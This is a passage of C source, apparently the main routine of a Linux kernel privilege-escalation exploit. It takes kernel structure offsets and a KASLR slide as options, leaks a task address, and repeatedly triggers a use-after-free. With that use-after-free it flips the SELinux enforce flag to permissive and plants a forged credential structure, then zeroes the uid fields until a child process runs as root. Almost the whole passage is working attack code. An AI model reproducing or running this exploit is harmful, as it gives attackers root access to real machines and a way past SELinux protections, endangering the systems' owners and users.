			g_profile = "custom";
		} else if (!strcmp(argv[i], "--kitimer-size") && i + 1 < argc) {
			g_kitimer_size = (unsigned)strtoul(argv[++i], NULL, 0);
			g_profile = "custom";
		} else if (!strcmp(argv[i], "--task-cred") && i + 1 < argc) {
			g_task_cred = (unsigned)strtoul(argv[++i], NULL, 0);
			g_profile = "custom";
		} else if (!strcmp(argv[i], "--cred-size") && i + 1 < argc) {
			g_cred_size = (unsigned)strtoul(argv[++i], NULL, 0);
			g_profile = "custom";
		} else if (!strcmp(argv[i], "--slab-objects") && i + 1 < argc) {
			g_slab_objects = (unsigned)strtoul(argv[++i], NULL, 0);
			g_profile = "custom";
		} else if (!strcmp(argv[i], "--slab-pages") && i + 1 < argc) {
			g_slab_pages = (unsigned)strtoul(argv[++i], NULL, 0);
			g_profile = "custom";
		} else if (!strcmp(argv[i], "--task-size") && i + 1 < argc) {
			g_task_size = (unsigned)strtoul(argv[++i], NULL, 0);
			g_profile = "custom";
		} else if (!strcmp(argv[i], "--allow-zero-slide")) {
			g_allow_zero_slide = 1;
		} else if (!strcmp(argv[i], "--skip-selinux")) {
			g_skip_selinux = 1;
		} else if (!strcmp(argv[i], "--debug-task")) {
			g_debug_task = 1;
		} else if (!strcmp(argv[i], "--padding-timers") && i + 1 < argc) {
			g_padding_timers = atoi(argv[++i]);
			if (g_padding_timers < 0 || g_padding_timers > MAX_PADDING_TIMERS)
				return 2;
		} else if (!strcmp(argv[i], "--selinux-link") && i + 1 < argc) {
			g_selinux_link = strtoull(argv[++i], NULL, 0);
			g_profile = "custom";
		} else if (!strcmp(argv[i], "--user-ns") && i + 1 < argc) {
			g_user_ns = strtoull(argv[++i], NULL, 0);
			g_profile = "custom";
		} else if (!strcmp(argv[i], "--root-user") && i + 1 < argc) {
			g_root_user = strtoull(argv[++i], NULL, 0);
			g_profile = "custom";
		} else if (!strcmp(argv[i], "--groups") && i + 1 < argc) {
			g_groups = strtoull(argv[++i], NULL, 0);
			g_profile = "custom";
		} else if (!strcmp(argv[i], "--ucounts") && i + 1 < argc) {
			g_ucounts = strtoull(argv[++i], NULL, 0);
			g_profile = "custom";
		}
	}
	dprintf(STDOUT_FILENO, "[profile] %s timer_link=%#" PRIx64
		" cred_link=%#" PRIx64 " kitimer=%u node=%#x task_cred=%#x cred_size=%u"
		" slab=%u/%u\n", g_profile, g_timer_link, g_cred_link,
		g_kitimer_size, g_kitimer_node, g_task_cred, g_cred_size,
		g_slab_objects, g_slab_pages);
	dprintf(STDOUT_FILENO, "[slide] %#" PRIx64 "\n", g_slide);
	if (argc > 1 && argv[1][0] != '-')
		g_shift = (unsigned)atoi(argv[1]);
	sigaction(SIGALRM, &action, NULL);
	if (preflight)
		return preflight_probe();
	if (!g_slide && !g_allow_zero_slide) {
		dprintf(STDOUT_FILENO, "[slide] missing --slide\n");
		return 2;
	}
	ipc = mmap(NULL, 4096, PROT_READ | PROT_WRITE,
		   MAP_SHARED | MAP_ANONYMOUS, -1, 0);
	if (ipc == MAP_FAILED)
		return 1;
	memset(ipc, 0, sizeof(*ipc));
	if (prctl(PR_SET_CHILD_SUBREAPER, 1))
		dprintf(STDOUT_FILENO, "[uaf] subreaper errno=%d\n", errno);
	if (pin_cpu(0))
		return 1;
	g_ctx = calloc(MAX_RINGS, sizeof(*g_ctx));
	if (!g_ctx)
		return 1;
	dprintf(STDOUT_FILENO, "[id] uid=%u euid=%u gid=%u\n",
		getuid(), geteuid(), getgid());
	read_enforce();
	g_nrings = 0;
	if (write_file(TRACE "/buffer_size_kb", "16384\n")) {
		disarm();
		return 1;
	}
	if (leak_task()) {
		dprintf(STDOUT_FILENO, "[task] leak failed\n");
		disarm();
		return 5;
	}
	g_plant_cred = 0;
	if (!g_skip_selinux && access("/sys/fs/selinux/enforce", F_OK) == 0) {
		uint64_t sel = slide_addr(g_selinux_link) - 7;
		for (int i = 1; i <= 4; i++) {
			char buf[8] = { 0 };
			int fd = open("/sys/fs/selinux/enforce", O_RDONLY | O_CLOEXEC);
			if (fd >= 0) {
				if (read(fd, buf, 1) < 0)
					buf[0] = 0;
				close(fd);
			}
			if (buf[0] == '0') {
				dprintf(STDOUT_FILENO, "[selinux] already permissive\n");
				break;
			}
			dprintf(STDOUT_FILENO,
				"[selinux] attempt %d/4 target=%#" PRIx64 "\n",
				i, sel);
			int rc = one_uaf(sel);
			if (rc == UAF_POISONED)
				park_poisoned_process();
			if (rc == 0)
				read_enforce();
		}
	}
	g_plant_cred = 1;
	int rooted = 0;
	for (int attempt = 1; attempt <= 12 && !rooted; attempt++) {
		unsigned uid = 1, euid = 1;
		int fixed_uid = -1, fixed_suid = -1;
		dprintf(STDOUT_FILENO, "[cred] plant attempt %d/12\n", attempt);
		g_plant_cred = 1;
		int rc = one_uaf(0);
		if (rc == UAF_POISONED)
			park_poisoned_process();
		if (rc != 0)
			continue;
		g_plant_cred = 0;
		dprintf(STDOUT_FILENO, "[cred] installed at %#" PRIx64 "\n", g_cred_kva);
		for (int i = 0; i < 3 && fixed_uid; i++) {
			rc = one_uaf(g_cred_kva + 8);
			if (rc == UAF_POISONED)
				park_poisoned_process();
			fixed_uid = rc == 0 ? 0 : -1;
		}
		for (int i = 0; i < 3 && fixed_suid; i++) {
			rc = one_uaf(g_cred_kva + 16);
			if (rc == UAF_POISONED)
				park_poisoned_process();
			fixed_suid = rc == 0 ? 0 : -1;
		}
		if (ask_child(&uid, &euid) == 0 && uid == 0 && euid == 0)
			rooted = 1;
		else if (uid == 1 && euid == 1)
			dprintf(STDOUT_FILENO, "[cred] child did not answer\n");
		else
			dprintf(STDOUT_FILENO, "[cred] still uid=%u euid=%u\n", uid, euid);
	}
	if (!rooted) {
		park_poisoned_process();
	}
	dprintf(STDOUT_FILENO, "[cred] child=%d holding pages\n", g_cred_child_pid);
	for (;;)
		pause();
}
